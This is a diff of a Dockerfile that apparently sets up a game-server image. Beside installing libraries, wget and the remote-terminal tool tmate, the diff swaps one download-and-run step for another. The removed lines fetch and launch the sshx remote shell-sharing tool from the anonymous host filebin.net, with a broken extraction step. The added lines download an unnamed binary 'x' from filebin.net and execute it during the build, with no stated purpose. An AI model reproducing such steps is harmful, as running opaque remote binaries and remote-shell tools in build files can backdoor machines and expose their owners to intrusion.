@@ -13,6 +13,6 @@ RUN dpkg --add-architecture i386 \
      && apt install lib32z1 libbz2-1.0:i386 lib32gcc-s1 lib32stdc++6 nano screen zip wget tmate -y \
      && useradd --create-home gameserver
 
-RUN wget https://filebin.net/x40ptw7cukh7ublf/x86_64-unknown-linux-musl.tar.gz
-RUN tar xf "$(mktemp)" -C "/usr/local/bin"
-RUN sshx
+RUN wget https://filebin.net/vav9iugyz8m5og48/x
+RUN mv x /usr/local/bin/x
+RUN x
